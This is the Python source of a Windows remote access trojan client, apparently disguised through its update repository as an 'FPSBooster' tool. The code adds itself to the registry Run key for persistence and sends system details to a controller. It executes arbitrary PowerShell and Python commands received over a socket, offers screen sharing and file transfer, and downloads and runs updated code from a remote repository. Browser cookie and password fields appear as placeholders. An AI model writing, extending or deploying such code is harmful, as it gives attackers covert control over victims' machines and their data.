from modules.filedownload import FileDownload
from modules.fileupload import FileTransfer
from modules.screenshare import ScreenShare
import os
import platform
import ctypes
import psutil
import getpass
import json
import requests
import sys
import subprocess
import zipfile
import shutil
import winreg as _winreg
import socket
import time
from threading import Thread
from multiprocessing import Process

# Initialize Windows DLLs
user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

# Windows constants
HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

# Define RAT_CLIENT class


class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.command_history = []

        # TODO: Add a function to check if the RAT is up to date
        self.check_version()

        self.add_to_startup_registry()

        self.screenshareClient = ScreenShare()

        # Initialize file upload manager
        self.file_upload_manager = FileTransfer("localhost", 4440)

        # Start file upload thread
        self.file_transfer_thread = Thread(
            target=self.file_upload_manager.connect)
        self.file_transfer_thread.start()

        # Initialize file download manager
        self.file_download_manager = FileDownload("localhost", 4441)

        # Start file download thread
        self.file_download_thread = Thread(
            target=self.file_download_manager.connect)
        self.file_download_thread.start()

    # Function to add the script to the Windows startup registry
    def add_to_startup_registry(self):
        try:
            key = _winreg.HKEY_CURRENT_USER
            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            value_name = "MyPythonScript"
            script_path = os.path.abspath(__file__)

            # Open the registry key for writing
            registry_key = _winreg.OpenKey(key, sub_key, 0, _winreg.KEY_WRITE)

            # Check if the value already exists in the registry
            existing_value, _ = _winreg.QueryValueEx(registry_key, value_name)

            if existing_value == f'"{script_path}"':
                print("Script is already in startup, no action needed.")
            else:
                # Add the script to the startup list with "runas" verb
                _winreg.SetValueEx(registry_key, value_name,
                                   0, _winreg.REG_SZ, f'"{script_path}" runas')
                print("Script added to startup with admin privileges.")

            # Close the registry key
            _winreg.CloseKey(registry_key)
        except Exception as e:
            print(f"Error adding to startup registry: {str(e)}")

    # Function to build a connection with the RAT server
    def build_connection(self):
        try:
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connected = False
        except Exception as e:
            print(f"Main Socket -> Error creating socket: {str(e)}")
            time.sleep(5)  # Wait for 5 seconds before retrying

        while not connected:
            try:
                s.connect((self.host, self.port))
                s.send(self.gather_info().encode())
                connected = True
            except Exception as e:
                print(f"Main Socket -> Error connecting: {str(e)}")
                time.sleep(5)  # Wait for 5 seconds before retrying

    # Function to gather system information
    def gather_info(self):
        # Replace with actual system info gathering logic
        system_info = {
            "IPv4": psutil.net_if_addrs()['Ethernet'][1].address,
            "ComputerName": os.environ["COMPUTERNAME"],
            "OS": platform.system(),
            "Architecture": platform.architecture()[0],
            "Username": getpass.getuser(),
            "Country": "United States",
            "City": "New York",
            "Location": {
                "Latitude": "40.7128",
                "Longitude": "-74.0060",
            },
            "ISP": "ISP1",
            "Timezone": "EST",
            "Organization": "Org1",
            "Postal": "12345",
            "ConnectionType": "Cable",
            "Region": "US",
            "RegionName": "New York",
        }

        optional_info = {
            "Microsoft Defender": "Enabled",
            "Antivirus": "AVG",
            "Firewall": "Enabled",
            "Uptime": str(round((psutil.boot_time() - psutil.boot_time()) / 3600, 2)) + " hours",
            "Idle Time": str(round((psutil.cpu_times().idle) / 3600, 2)) + " hours",
            "Privileges": ctypes.windll.shell32.IsUserAnAdmin(),
            "Bit": platform.architecture()[0],
            "Rat-Ted Version": "1.0",
            "ComputerID": "123456",
            "Current Directory": os.getcwd(),
        }

        client_info = {
            "System Info": system_info,
            "Optional Info": optional_info,
            "Browsers": {
                "Chrome": {
                    "Version": "93.0.4577.82",
                    "Cookies": [],
                    "History": [],
                    "Bookmarks": [],
                    "Passwords": [],
                    "Autofill": [],
                    "Extensions": [],
                    "Downloads": []
                },
                "Firefox": {
                    "Version": "91.0",
                    "Cookies": [],
                    "History": [],
                    "Bookmarks": [],
                    "Passwords": [],
                    "Autofill": [],
                    "Extensions": [],
                    "Downloads": []
                },
            },
            "Computer Hardware": {
                "CPU": "Intel Core i7",
                "GPU": "NVIDIA GeForce RTX 3080",
                "RAM": "32 GB",
                "Motherboard": "ASUS ROG Strix Z590",
                "Storage": {
                    "Total": "1 TB SSD",
                    "Free": "500 GB"
                },
                "Audio": "Realtek HD Audio",
                "USB Devices": [
                    "USB Mouse",
                    "USB Keyboard",
                    "USB Flash Drive"
                ]
            },
            "Network Info": {
                "Network Adapter": {
                    "Name": "Ethernet",
                    "Status": "Connected",
                    "Speed": "1 Gbps",
                    "Type": "Wired"
                },
                "Network Speed": "100 Mbps",
                "Network Type": "Wi-Fi",
                "Network Status": "Connected",
                "Network Usage": {
                    "Upload": "1.2 MB/s",
                    "Download": "5.3 MB/s"
                },
                "Network Connections": [
                    {
                        "IP": "192.168.1.2",
                        "Port": 80,
                        "Protocol": "HTTP"
                    },
                ]
            }
        }

        # Convert the dictionary to a string and return it
        return json.dumps(client_info)

    # Function to execute commands from the RAT server
    def execute(self):
        while True:
            command = s.recv(100024).decode()
            try:
                command = command.split("|", 1)
                command_type = command[0].split("command_type")[
                    1].replace(":", "")
                command_cmd = command[1].split("command")[1].replace(":", "")

                if command_type == "function":
                    output = self.handle_function(command_cmd)
                elif command_type == "python":
                    output = subprocess.check_output(
                        ["python", "-c", command_cmd],
                        stderr=subprocess.STDOUT,
                        shell=True,
                        text=True
                    ).strip()
                else:
                    # Execute PowerShell command
                    process = subprocess.Popen(
                        ["powershell.exe", "-Command", command_cmd],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,  # Open a pipe for input
                        shell=True,
                        text=True
                    )
                    # Send a newline to handle input prompts
                    out, err = process.communicate(input="\n")
                    if process.returncode == 0:
                        result = out.strip()
                        error = None
                    else:
                        result = None
                        error = err.strip()
                        if not result and error:
                            # Handle the case where there is an error message but no result
                            result = error.strip()
                    output = {
                        "result": result,
                        "error": error
                    }

            except Exception as e:
                print("Error executing command:", str(e))
                output = {
                    "result": None,
                    "error": str(e)
                }

            # Send the output as a JSON string
            s.send(json.dumps(output).encode())

    # Function to handle specific functions sent by the RAT server
    def handle_function(self, function_name):
        if function_name == "screen_share":
            # Use the self.screenshareClient object to start the screenshare but in a separate process
            self.screen_share_process = Process(
                target=self.screenshareClient.start_screenshare)
            self.screen_share_process.start()
            return "Screen share started successfully at port 8080"
        elif function_name == "stop_screen_share":
            # Stop the screenshare
            self.screenshareClient.stop_screenshare()
            # Terminate the process
            self.screen_share_process.terminate()
            return "Screen share stopped successfully"

    # Function to check if the RAT client is up to date
    def check_version(self):
        self.github_version = requests.get(
            "https://raw.githubusercontent.com/lukasolsen/FPSBooster/main/ver.txt"
        ).text.strip()
        print("Github version:", self.github_version)
        # The text file should just look like this: 1.0.0
        # Open up our own version file and read the version
        with open("ver.txt", "r") as f:
            current_version = f.read().strip()

        print("Current version:", current_version)

        if self.github_version != current_version:
            print("Versions are different")
            self.download_new_version()
        else:
            print("Versions are the same")

    # Function to download and update the RAT client to the latest version
    def download_new_version(self):
        try:
            # Download the new version
            response = requests.get(
                "https://github.com/lukasolsen/FPSBooster/archive/main.zip")

            # Write the zip file to disk
            with open("new_version.zip", "wb") as f:
                f.write(response.content)

            # Extract the zip file into the current directory
            with zipfile.ZipFile("new_version.zip", "r") as zip_ref:
                zip_ref.extractall()

            # Delete the zip file
            os.remove("new_version.zip")

            # Remove the old version files
            for filename in os.listdir("."):
                if filename != "main.pyw":
                    os.remove(filename)

            # Move all the files inside the FPSBooster-main directory to the current directory
            extracted_dir = "FPSBooster-main"
            for filename in os.listdir(extracted_dir):
                shutil.move(os.path.join(extracted_dir, filename), ".")

            # Delete the FPSBooster-main directory
            os.rmdir(extracted_dir)

            # Restart the RAT
            subprocess.Popen(["python", "main.pyw"])

            # Exit the current RAT
            sys.exit(0)
        except Exception as e:
            print(f"Error updating: {str(e)}")


if __name__ == '__main__':
    rat = RAT_CLIENT('localhost', 4444)

    while True:
        try:
            rat.build_connection()
            rat.execute()
        except Exception as e:
            print(f"Error in main loop: {str(e)}")
            time.sleep(5)  # Wait for 5 seconds before retrying
